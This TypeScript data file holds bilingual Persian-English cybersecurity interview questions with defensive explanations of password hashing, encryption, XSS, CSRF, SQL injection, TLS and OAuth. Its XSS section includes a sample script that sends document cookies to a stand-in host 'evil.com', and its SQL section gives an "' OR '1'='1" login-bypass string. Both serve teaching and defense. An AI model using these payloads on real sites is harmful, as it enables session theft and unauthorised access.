import type { InterviewField } from "../schema";

/**
 * DATA FILE — Interview questions. Consumed by: /interview hub page,
 * /interview/[field] Q&A page, landing page stats.
 * Strictly educational & defensive content.
 */
export const cybersecurityInterview: InterviewField = {
  slug: "cybersecurity",
  title: { fa: "مصاحبه امنیت سایبری", en: "Cybersecurity interviews" },
  description: {
    fa: "سوال‌های واقعی مصاحبه‌های امنیت در ۲۰۲۶: رمزنگاری، هش، XSS/CSRF، SQL Injection، TLS و OAuth — با تمرکز بر مفهوم و دفاع.",
    en: "Real 2026 security interview questions: cryptography, hashing, XSS/CSRF, SQL injection, TLS and OAuth — focused on concepts and defenses.",
  },
  icon: "shield",
  accent: "rose",
  questions: [
    {
      id: "hashing-vs-encryption",
      question: {
        fa: "هش و رمزنگاری چه فرقی دارند؟ پسورد را چطور ذخیره می‌کنید؟",
        en: "Hashing vs encryption — and how do you store passwords?",
      },
      difficulty: "junior",
      tags: ["hashing", "passwords", "bcrypt"],
      quickAnswer: {
        fa: "رمزنگاری دوطرفه است: با کلید می‌توان متن را برگرداند. هش یک‌طرفه است: خروجی را نمی‌توان به ورودی برگرداند. پسورد را هرگز رمزنگاری یا ساده هش نمی‌کنیم — با الگوریتم‌های کند و نمک‌دار مثل bcrypt/argon2 هش می‌کنیم تا حمله‌ی brute-force عملاً غیرممکن شود.",
        en: "Encryption is two-way: with the key you can reverse it. Hashing is one-way: the output can't be turned back into the input. Passwords are never encrypted or plainly hashed — they're hashed with slow, salted algorithms like bcrypt/argon2 so brute-force becomes practically impossible.",
      },
      steps: [
        {
          title: { fa: "دو ابزار با دو هدف", en: "Two tools, two goals" },
          detail: {
            fa: "رمزنگاری وقتی است که بعداً باید بخوانید (پیام‌ها، فایل‌ها). هش وقتی فقط باید «تطبیق» را ثابت کنید، بدون دیدن متن (پسورد، بررسی صحت فایل).",
            en: "Encryption is for when you must read it back later (messages, files). Hashing is for proving a match without ever seeing the original (passwords, file integrity).",
          },
        },
        {
          title: { fa: "هش مثل انگشت‌نگاری", en: "A hash is like a fingerprint" },
          detail: {
            fa: "از هر ورودی، اثری با طول ثابت ساخته می‌شود؛ تغییر یک بیت، اثر را کاملاً عوض می‌کند (اثر باغ‌برفی). برگشت‌دادن اثر به متن اصلی، از نظر محاسباتی ناممکن است.",
            en: "Every input yields a fixed-length fingerprint; flipping one bit completely changes it (the avalanche effect). Reversing the fingerprint back to the original is computationally infeasible.",
          },
        },
        {
          title: { fa: "چرا هشِ ساده برای پسورد خطرناک است", en: "Why plain hashing fails for passwords" },
          detail: {
            fa: "پسوردها انگشت‌شمارند؛ مهاجم جدول از پیش‌محاسبه‌شده (rainbow table) دارد: هشِ «123456» را با یک نگاه پیدا می‌کند. هش سریع یعنی میلیاردها حدس در ثانیه روی GPU.",
            en: "Passwords are a tiny search space; attackers keep precomputed rainbow tables — the hash of '123456' is one lookup away. Fast hashing means billions of guesses per second on GPUs.",
          },
        },
        {
          title: { fa: "نمک + کندی = دفاع", en: "Salt + slowness = defense" },
          detail: {
            fa: "نمک (مقدار تصادفیِ یکتا برای هر کاربر) rainbow table را بی‌اثر می‌کند. الگوریتم‌های کند (bcrypt/argon2 با cost factor) هر حدس را میلی‌ثانیه‌ای می‌کنند؛ برای لاگین قابل‌تحمل، برای brute-force کابوس.",
            en: "A per-user random salt kills rainbow tables. Slow algorithms (bcrypt/argon2 with a cost factor) make each guess take milliseconds — tolerable for login, nightmarish for brute-force.",
          },
        },
        {
          title: { fa: "جریان درست ذخیره‌سازی", en: "The correct storage flow" },
          detail: {
            fa: "ثبت‌نام: salt تصادفی بساز → با bcrypt/argon2 هش کن → نمک و هش را ذخیره کن. ورود: همان ورودی را با نمکِ ذخیره‌شده هش کن و مقایسه کن. پسورد اصلی هرگز ذخیره نمی‌شود و حتی ادمین هم نمی‌تواند بخواندش.",
            en: "Signup: generate a random salt → hash with bcrypt/argon2 → store salt and hash. Login: hash the input with the stored salt and compare. The raw password is never stored — even admins can't read it.",
          },
        },
      ],
      codeExample: {
        language: "javascript",
        code: `import bcrypt from "bcrypt";

// signup
const hash = await bcrypt.hash(password, 12); // salt is baked in
await db.users.insert({ email, passwordHash: hash });

// login
const ok = await bcrypt.compare(password, user.passwordHash);
if (!ok) return res.status(401).json({ error: "invalid credentials" });`,
        caption: {
          fa: "bcrypt نمک‌سازی و cost را خودش انجام می‌دهد",
          en: "bcrypt handles salting and the cost factor for you",
        },
      },
      followUps: [
        { fa: "bcrypt یا argon2 — کدام و چرا؟", en: "bcrypt or argon2 — which and why?" },
        { fa: "session fixation چیست؟", en: "What is session fixation?" },
      ],
      visual: "encryption",
    },
    {
      id: "symmetric-vs-asymmetric",
      question: {
        fa: "رمزنگاری متقارن و نامتقارن چه فرقی دارند؟ هرکدام کجا به کار می‌روند؟",
        en: "How do symmetric and asymmetric encryption differ, and where is each used?",
      },
      difficulty: "junior",
      tags: ["cryptography", "tls", "keys"],
      quickAnswer: {
        fa: "متقارن یعنی یک کلید هم قفل می‌کند هم باز می‌کند (AES) — سریع ولی مشکل توزیع کلید دارد. نامتقارن یعنی زوج کلید: کلید عمومی قفل می‌کند و کلید خصوصی باز (RSA/ECC) — توزیع را حل می‌کند ولی کند است. دنیای واقعی ترکیبشان است: TLS با نامتقارن توافق می‌کند و بعد با متقارن حرف می‌زند.",
        en: "Symmetric uses one key to lock and unlock (AES) — fast, but key distribution is the problem. Asymmetric uses a key pair: the public key locks, the private key unlocks (RSA/ECC) — it solves distribution but is slow. The real world combines them: TLS agrees on keys asymmetrically, then talks symmetrically.",
      },
      steps: [
        {
          title: { fa: "متقارن: یک کلید مشترک", en: "Symmetric: one shared key" },
          detail: {
            fa: "مثل جعبه‌ای که با یک کلید قفل و باز می‌شود؛ هر دو طرف همان کلید را دارند (AES-256). بسیار سریع است — پس داده‌های حجمی با آن رمز می‌شوند.",
            en: "Like a box locked and opened by the same key; both parties hold it (AES-256). Very fast — that's why bulk data uses it.",
          },
        },
        {
          title: { fa: "مشکل کلاسیک: چطور کلید بفرستیم؟", en: "The classic problem: how do you send the key?" },
          detail: {
            fa: "اگر کلید را از همان کانال ناامن بفرستید، شنود هم می‌گیردش. این «مسئله‌ی توزیع کلید» است که تا قبل از رمزنگاری نامتقارن حل‌نشده بود.",
            en: "Sending the key over the same insecure channel means the eavesdropper gets it too — the 'key distribution problem' that stayed unsolved until asymmetric cryptography.",
          },
        },
        {
          title: { fa: "نامتقارن: قفل عمومی، کلید خصوصی", en: "Asymmetric: public lock, private key" },
          detail: {
            fa: "کلید عمومی مثل قفلی است که هر کسی می‌تواند ببندد ولی فقط صاحب کلید خصوصی باز می‌کند. پیام برای من؟ با کلید عمومی من رمز کن؛ فقط من باز می‌کنم.",
            en: "The public key is like a padlock anyone can snap shut but only the owner's private key opens. To message me: encrypt with my public key; only I can open it.",
          },
        },
        {
          title: { fa: "برعکسش = امضای دیجیتال", en: "Flip it = digital signatures" },
          detail: {
            fa: "اگر با کلید خصوصی «قفل» کنید و همه با کلید عمومی باز کنند، یعنی امضا: فقط صاحب کلید خصوصی می‌توانسته ساخته باشد، پس هویت و صحت پیام ثابت می‌شود.",
            en: "If you 'lock' with the private key and everyone verifies with the public one, that's a signature: only the private-key holder could have made it, proving identity and integrity.",
          },
        },
        {
          title: { fa: "ترکیب در TLS", en: "The combination in TLS" },
          detail: {
            fa: "HTTPS: ابتدا با نامتقارن (و گواهی سرور) طرفین یک کلید متقارن موقت توافق می‌کنند؛ بعد کل ترافیک با AES سریع می‌رود. بهترین هر دو دنیا.",
            en: "HTTPS: asymmetric crypto (plus the server certificate) first agrees on a temporary symmetric key; then all traffic flows via fast AES. Best of both worlds.",
          },
        },
      ],
      codeExample: {
        language: "bash",
        code: `# generate a key pair (asymmetric)
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# anyone can encrypt with the public key...
openssl pkeyutl -encrypt -in message.txt \\
  -pubin -inkey public.pem -out msg.enc

# ...but only the private key can decrypt it
openssl pkeyutl -decrypt -in msg.enc -inkey private.pem -out msg.txt`,
        caption: {
          fa: "قفل با عمومی، باز کردن فقط با خصوصی",
          en: "Lock with the public key; open only with the private key",
        },
      },
      followUps: [
        { fa: "گواهی دیجیتال چه چیزی را تضمین می‌کند؟", en: "What does a digital certificate actually guarantee?" },
        { fa: "چرا طول کلید RSA ۲۰۴۸ بیت و AES ۲۵۶ بیت است؟", en: "Why is RSA 2048-bit but AES 256-bit?" },
      ],
      visual: "encryption",
    },
    {
      id: "xss-vs-csrf",
      question: {
        fa: "XSS و CSRF چه تهدیدهایی هستند و چطور دفاع می‌کنید؟",
        en: "What threats are XSS and CSRF, and how do you defend against them?",
      },
      difficulty: "mid",
      tags: ["xss", "csrf", "web-security"],
      quickAnswer: {
        fa: "XSS یعنی مهاجم جاوااسکریپت خودش را در صفحه‌ی کاربر اجرا می‌کند (کد غریبه در خانه‌ی شما)؛ CSRF یعنی مهاجم مرورگر کاربر را فریب می‌دهد درخواست جعلی با اعتبار کاربر بفرستد (چک سفیدشده). دفاع XSS: escape و CSP. دفاع CSRF: توکن CSRF در فرم‌ها و SameSite cookies.",
        en: "XSS means the attacker's JavaScript runs inside the user's page (a stranger's code in your house); CSRF tricks the user's browser into firing a forged request that still carries the user's credentials (a cashed blank check). XSS defenses: escaping and CSP. CSRF defenses: CSRF tokens and SameSite cookies.",
      },
      steps: [
        {
          title: { fa: "XSS: کد غریبه در صفحه", en: "XSS: stranger's code on your page" },
          detail: {
            fa: "اگر ورودی کاربر را بدون escape در HTML بگذارید، کامنتی مثل <script>fetch('evil.com?c='+document.cookie)</script> در مرورگر هر بازدیدکننده اجرا می‌شود: سرقت کوکی، تغییر صفحه، ارسال داده.",
            en: "If user input lands in HTML unescaped, a comment like <script>fetch('evil.com?c='+document.cookie)</script> runs in every visitor's browser: cookie theft, page tampering, data exfiltration.",
          },
        },
        {
          title: { fa: "دفاع XSS: سه لایه", en: "XSS defense: three layers" },
          detail: {
            fa: "۱) هر متن را با فریم‌ورک‌تان escape کنید (React به‌صورت پیش‌فرض می‌کند) و هرگز innerHTML با داده‌ی کاربر نگذارید. ۲) Content-Security-Policy تا اسکریپت‌های خارجی ناشناس بار نشوند. ۳) کوکی‌های httpOnly تا JS به کوکی‌ها نرسد.",
            en: "1) Escape all text through your framework (React does by default) and never set innerHTML from user data. 2) A Content-Security-Policy blocks unknown external scripts. 3) httpOnly cookies keep JS away from them.",
          },
        },
        {
          title: { fa: "CSRF: درخواست جعلی با اعتبار خودت", en: "CSRF: a forged request with your credentials" },
          detail: {
            fa: "اگر احراز هویت با کوکی خودکار باشد، یک صفحه‌ی مهاجم می‌تواند با فرم پنهان یا تصویر src به bank.com/transfer، مرورگر شما را وادار کند درخواست با کوکی‌های شما بفرستد.",
            en: "With cookie-based auth, an attacker's page can make your browser POST to bank.com/transfer via a hidden form or img src — the request carries your cookies automatically.",
          },
        },
        {
          title: { fa: "دفاع CSRF: توکن و SameSite", en: "CSRF defense: token + SameSite" },
          detail: {
            fa: "توکن CSRF: سرور مقدار مخفی یکتا در فرم می‌گذارد و انتظارش را در submit دارد؛ سایت مهاجم نمی‌تواند بخواندش (Same-Origin Policy). SameSite=Lax/Strict هم مانع ارسال خودکار کوکی در درخواست‌های بین‌سایتی می‌شود.",
            en: "CSRF token: the server embeds a secret unique value in each form and expects it back on submit; the attacker's site can't read it (Same-Origin Policy). SameSite=Lax/Strict also stops cookies riding cross-site requests automatically.",
          },
        },
        {
          title: { fa: "خط رایج در مصاحبه", en: "The common interview slip" },
          detail: {
            fa: "XSS با «sanitize کردن» کامل حل نمی‌شود و CSRF با JWT در هدر تقریباً منتفی می‌شود (چون هدر خودکار فرستاده نمی‌شود) — این تفاوت را بدانید، سوال بعدی همین است.",
            en: "XSS isn't fully solved by 'sanitizing', and CSRF mostly disappears if auth is a JWT in a header (headers aren't sent automatically) — know this distinction; it's the usual follow-up.",
          },
        },
      ],
      codeExample: {
        language: "javascript",
        code: `// XSS: never do this
el.innerHTML = userComment;

// safe — React escapes by default
<div>{userComment}</div>

// CSRF: token per session + SameSite cookie
app.use(csrf({ cookie: true }));       // double-submit pattern
res.cookie("session", sid, {
  httpOnly: true,
  sameSite: "lax",                     // blocks cross-site sends
  secure: true,
});`,
        caption: {
          fa: "escape + CSP + httpOnly برای XSS؛ توکن + SameSite برای CSRF",
          en: "Escape + CSP + httpOnly for XSS; token + SameSite for CSRF",
        },
      },
      followUps: [
        { fa: "XSS ذخیره‌شده و منعکس‌شده چه فرقی دارند؟", en: "Stored vs reflected XSS?" },
        { fa: "CSP دقیقاً چه چیزی را بلاک می‌کند؟", en: "What exactly does CSP block?" },
      ],
      visual: "none",
    },
    {
      id: "sql-injection",
      question: {
        fa: "SQL Injection چیست و چرا پارامترسازی کامل حلش می‌کند؟",
        en: "What is SQL injection, and why does parameterization fully solve it?",
      },
      difficulty: "mid",
      tags: ["sql", "injection", "owasp"],
      quickAnswer: {
        fa: "وقتی ورودی کاربر به‌صورت متن به کوئری می‌چسبد، کاربر می‌تواند کد SQL بگنجاند: در فیلد username تایپ می‌کند ' OR '1'='1 و شرط همیشه درست می‌شود. حل قطعی، پارامترسازی است: SQL و داده جدا می‌شوند و داده هرگز به‌عنوان کد parse نمی‌شود.",
        en: "When user input is glued into SQL as text, users can smuggle code: typing ' OR '1'='1 in the username field makes the condition always true. The definitive fix is parameterization: SQL and data travel separately, so data is never parsed as code.",
      },
      steps: [
        {
          title: { fa: "صحنه‌ی خطا", en: "The mistake" },
          detail: {
            fa: "کوئری با چسباندن رشته ساخته می‌شود: \"SELECT * FROM users WHERE name='\" + input + \"'\". ورودی دیگر داده نیست — کد است، چون پایگاه داده مجبور است کل رشته را parse کند.",
            en: "The query is built by string concatenation: \"SELECT * FROM users WHERE name='\" + input + \"'\". The input is no longer data — it's code, because the database must parse the whole string.",
          },
        },
        {
          title: { fa: "استفاده‌های مخرب", en: "What attackers do with it" },
          detail: {
            fa: "بایپس لاگین با شرط همیشه‌درست؛ استخراج داده با UNION؛ در بدترین حالت (با دسترسی‌های اشتباه) حذف جدول‌ها یا خواندن فایل سرور. رتبه‌ی اول کلاسیک OWASP.",
            en: "Login bypass via always-true conditions; data exfiltration via UNION; worst case (with wrong privileges) dropping tables or reading server files. A classic top OWASP risk.",
          },
        },
        {
          title: { fa: "پارامترسازی: جداسازی کد از داده", en: "Parameterization: separating code from data" },
          detail: {
            fa: "در prepared statement، ساختار کوئری با placeholder از قبل فرستاده می‌شود و مقدارها جداگانه. دیتابیس مقدار را فقط به‌عنوان «مقدار» می‌بیند؛ حتی اگر شکل SQL داشته باشد، هرگز اجرا نمی‌شود.",
            en: "In a prepared statement the query structure with placeholders goes first, then values separately. The DB treats values as pure values; even if they look like SQL, they're never executed.",
          },
        },
        {
          title: { fa: "ORMها هم از شما محافظت می‌کنند تا وقتی…", en: "ORMs protect you — until…" },
          detail: {
            fa: "Prisma/Django/Sequelize به‌صورت پیش‌فرض پارامتری‌اند. خطر جایی برمی‌گردد که raw query می‌نویسید یا رشته‌ی ORDER BY را از کاربر می‌گیرید. هر escape دستی جای بدی است؛ همیشه پارامتر.",
            en: "Prisma/Django/Sequelize parameterize by default. Risk returns when you write raw queries or take ORDER BY strings from users. Manual escaping is the wrong tool — always parameterize.",
          },
        },
        {
          title: { fa: "دفاع در لایه‌ها", en: "Defense in depth" },
          detail: {
            fa: "پارامترسازی خط اول است، نه تنها خط: کاربر دیتابیس حداقل‌دسترسی داشته باشد، پیام‌های خطای SQL به کاربر نشود، ورودی‌ها whitelist شوند و WAF به‌عنوان تور اضافه.",
            en: "Parameterization is the first line, not the only one: least-privilege DB users, never leak SQL errors to users, whitelist input formats, plus a WAF as an extra net.",
          },
        },
      ],
      codeExample: {
        language: "javascript",
        code: `// ❌ vulnerable — input becomes code
db.query(
  \`SELECT * FROM users WHERE email='\${email}'\`
);
// email = "' OR '1'='1 --"  → logs in as the first user

// ✅ parameterized — input stays data
db.query(
  "SELECT * FROM users WHERE email = $1",
  [email]
);`,
        caption: {
          fa: "همین یک تغییر، کل کلاس حمله را می‌بندد",
          en: "One change closes the whole attack class",
        },
      },
      followUps: [
        { fa: "چرا escape کردن دستی کافی نیست؟", en: "Why isn't manual escaping enough?" },
        { fa: "blind SQL injection چطور کار می‌کند و چطور کشف می‌شود؟", en: "How does blind SQL injection work and how is it detected?" },
      ],
      visual: "none",
    },
    {
      id: "tls-handshake",
      question: {
        fa: "دست‌دادن TLS چطور یک کانال امن می‌سازد؟",
        en: "How does the TLS handshake establish a secure channel?",
      },
      difficulty: "senior",
      tags: ["tls", "https", "certificates"],
      quickAnswer: {
        fa: "TLS با سه کار کانال می‌سازد: ۱) اثبات هویت سرور با گواهی امضاشده‌ی CA، ۲) توافق روی کلیدهای رمزنگاری با اکتری‌جی مقدارها تا شنود و تکرار نشود، ۳) رمزکردن همه‌ی ترافیک با کلید متقارنِ موقتِ همان جلسه. کل مکالمه بعد از آن حتی برای کسی که بسته‌ها را دارد، ناخواناست.",
        en: "TLS builds a channel in three moves: 1) prove the server's identity with a CA-signed certificate, 2) agree on cryptographic keys using random contributions from both sides (so eavesdropping and replay fail), 3) encrypt all traffic with a session-temporary symmetric key. After that, even someone holding the packets can't read them.",
      },
      steps: [
        {
          title: { fa: "مشکل: گفت‌وگو در میدان شنود", en: "The problem: talking in an open field" },
          detail: {
            fa: "اینترنت مسیر عمومی است؛ روترها و وای‌فای‌های بین راه بسته‌ها را می‌بینند. باید بدون تبادل از پیشِ کلید، راز مشترک بسازید — و مطمئن باشید طرف مقابل همان سرور واقعی است.",
            en: "The internet is a public road; routers and Wi-Fi along the way see packets. You must build a shared secret without pre-sharing keys — and be sure the other side is the real server.",
          },
        },
        {
          title: { fa: "گواهی: شناسنامه‌ی امضاشده", en: "The certificate: a signed ID card" },
          detail: {
            fa: "سرور گواهی‌ای می‌فرستد که دامنه و کلید عمومی‌اش را CA امضا کرده. مرورگر زنجیره‌ی امضا تا CA مورد‌اعتمادش را چک می‌کند. CA یعنی «اداره‌ی ثبت احوال» این دنیا؛ اگر زنجیره سالم نیست، مرورگر هشدار می‌دهد.",
            en: "The server sends a certificate with its domain and public key, signed by a CA. The browser validates the chain to a trusted root. The CA is this world's civil registry; a broken chain triggers the browser warning.",
          },
        },
        {
          title: { fa: "توافق کلید بدون فرستادن کلید", en: "Key agreement without sending keys" },
          detail: {
            fa: "با ECDHE، هر دو طرف یک «بخش عمومی» از یک راز می‌فرستند و با ترکیب‌شان، هر دو به همان کلید جلسه می‌رسند؛ شنودِ هر دو بخش، راز را نمی‌فهمد (مسئله‌ی سختی ریاضی).",
            en: "With ECDHE both sides exchange a public fragment of a secret; combining their own private part yields the same session key. An eavesdropper holding both public fragments still can't compute it (hard math).",
          },
        },
        {
          title: { fa: "Forward secrecy", en: "Forward secrecy" },
          detail: {
            fa: "چون کلید جلسه موقتی است و هر جلسه جدید می‌سازد، حتی لو رفتن کلید خصوصی سرور در آینده، مکالمات گذشته را رمزگشایی نمی‌کند — این همان E در ECDHE است.",
            en: "Because each session key is temporary and fresh, even a future leak of the server's private key can't decrypt past conversations — that's the E in ECDHE.",
          },
        },
        {
          title: { fa: "بعد از دست‌دادن", en: "After the handshake" },
          detail: {
            fa: "همه‌چیز با AES رمز می‌شود و هر رکورد با MAC/AAEAD تضمین می‌شود که دست‌نخورده است. کاربر فقط می‌بیند قفل کنار URL است — زیر آن، تمام این رقص در چند ده میلی‌ثانیه انجام شده.",
            en: "Everything is then encrypted with AES and integrity-protected via AEAD. Users just see the padlock — underneath, the whole dance ran in tens of milliseconds.",
          },
        },
      ],
      codeExample: {
        language: "bash",
        code: `# watch a real handshake (openssl s_client)
openssl s_client -connect example.com:443 -brief

# → Protocol version: TLSv1.3
# → Ciphersuite: TLS_AES_128_GCM_SHA256
# → Server certificate: CN=example.com, signed by Let's Encrypt
# → Verified peer certificate chain ✓`,
        caption: {
          fa: "هویت + توافق کلید + رمز — همه در TLS 1.3 با یک رفت‌وبرگشت",
          en: "Identity + key agreement + encryption — one round trip in TLS 1.3",
        },
      },
      followUps: [
        { fa: "حمله‌ی man-in-the-middle را TLS چطور می‌بندد؟", en: "How does TLS defeat man-in-the-middle attacks?" },
        { fa: "فرق HTTP و HTTPS در عملکرد (latency) چیست؟", en: "What's the real latency difference between HTTP and HTTPS?" },
      ],
      visual: "encryption",
    },
    {
      id: "oauth2-basics",
      question: {
        fa: "OAuth 2.0 چه مشکلی را حل می‌کند و جریان authorization code چطور کار می‌کند؟",
        en: "What problem does OAuth 2.0 solve, and how does the authorization code flow work?",
      },
      difficulty: "senior",
      tags: ["oauth", "auth", "sso"],
      quickAnswer: {
        fa: "OAuth به اپ شما اجازه می‌دهد به داده‌های کاربر در سرویس دیگری دسترسی محدود بگیرد — بدون اینکه پسورد کاربر را ببیند. در جریان authorization code، اپ کاربر را به سرور لاگین می‌فرستد، کد موقت می‌گیرد و سمت سرور با secret اپ، کد را با توکن عوض می‌کند؛ توکن فقط دسترسی‌های تعیین‌شده (scope) دارد.",
        en: "OAuth lets your app access a user's data on another service — without ever seeing their password. In the authorization code flow, the app sends the user to the login server, gets a temporary code, and (server-side, with the app's secret) swaps the code for tokens; those tokens only carry the granted scopes.",
      },
      steps: [
        {
          title: { fa: "مشکل: پسورد دادن به اپ‌ها", en: "The problem: giving apps your password" },
          detail: {
            fa: "قبل از OAuth، اپ‌های ثالث برای کار با داده‌تان (مثلاً چاپ عکس‌ها) پسورد شما را می‌خواستند — یعنی قدرت کامل، بدون کنترل و بدون امکان اخراج. OAuth جایگزین این شد.",
            en: "Before OAuth, third-party apps needed your raw password to act on your data — full power, no control, no eviction. OAuth replaced that.",
          },
        },
        {
          title: { fa: "سه بازیگر + مهمان", en: "Three actors + a guest" },
          detail: {
            fa: "کاربر (مالک داده)، اپ شما (کلاینت)، سرور مجاز (مثلاً گوگل). اپ هیچ‌وقت پسورد نمی‌بیند؛ فقط یک اجازه‌نامه‌ی محدود با scopeهای مشخص می‌گیرد.",
            en: "The user (data owner), your app (client), and the authorization server (e.g. Google). Your app never sees a password — only a limited grant with specific scopes.",
          },
        },
        {
          title: { fa: "قدم‌های جریان", en: "The flow's steps" },
          detail: {
            fa: "۱) اپ کاربر را با redirect به سرور مجاز می‌فرستد و state تصادفی می‌برد. ۲) کاربر همان‌جا لاگین و رضایت می‌دهد. ۳) سرور با کد موقت به callback اپ برمی‌گرداند. ۴) سرورِ اپ، کد را با client secret به توکن تبدیل می‌کند.",
            en: "1) The app redirects the user to the authorization server with a random state. 2) The user logs in and consents there. 3) The server returns a temporary code to the app's callback. 4) The app's backend swaps the code for tokens using its client secret.",
          },
        },
        {
          title: { fa: "چرا code به‌جای توکن مستقیم", en: "Why a code instead of a direct token" },
          detail: {
            fa: "توکن اگر در مرورگر بیفتد (fragment URL) لو می‌رود؛ کد بی‌ارزش است تا وقتی با client secret (که فقط سمت سرور است) مبادله شود. state هم از CSRF در این جریان جلوگیری می‌کند.",
            en: "A token landing in the browser (URL fragment) leaks; a code is worthless until exchanged with the client secret, which only the backend has. The state parameter blocks CSRF in this flow.",
          },
        },
        {
          title: { fa: "scope، refresh و OIDC", en: "Scopes, refresh and OIDC" },
          detail: {
            fa: "توکن فقط scopeهای رضایت‌شده را دارد (مثل profile، email). refresh token برای تمدید بدون لاگین دوباره. اگر «این کاربر کیست؟» می‌خواهید نه فقط «اجازه»، OpenID Connect لایه‌ی هویت روی OAuth است.",
            en: "Tokens carry only consented scopes (profile, email…). Refresh tokens renew without re-login. If you need 'who is this user?' rather than just 'permission', that's OpenID Connect — an identity layer over OAuth.",
          },
        },
      ],
      codeExample: {
        language: "javascript",
        code: `// 1) redirect the user
const url = "https://auth.google.com/authorize?" + new URLSearchParams({
  client_id: APP_ID,
  redirect_uri: "https://myapp.com/callback",
  scope: "profile email",
  state: crypto.randomUUID(),      // CSRF guard
  response_type: "code",
});

// 2) in the callback (backend only!)
const { code, state } = req.query;
if (state !== savedState) throw new Error("CSRF!");

const tokens = await fetch("https://auth.google.com/token", {
  method: "POST",
  body: { code, client_id: APP_ID, client_secret: APP_SECRET, grant_type: "authorization_code" },
}); // the secret never leaves the server`,
        caption: {
          fa: "کد در URL بی‌ارزش است؛ فقط با secret سمت سرور توکن می‌شود",
          en: "The code in the URL is worthless; only the server-side secret turns it into tokens",
        },
      },
      followUps: [
        { fa: "فرق OAuth و OpenID Connect؟", en: "OAuth vs OpenID Connect?" },
        { fa: "PKCE چه مشکلی را در اپ‌های موبایل حل می‌کند؟", en: "What does PKCE fix for mobile apps?" },
      ],
      visual: "auth-jwt",
    },
  ],
};
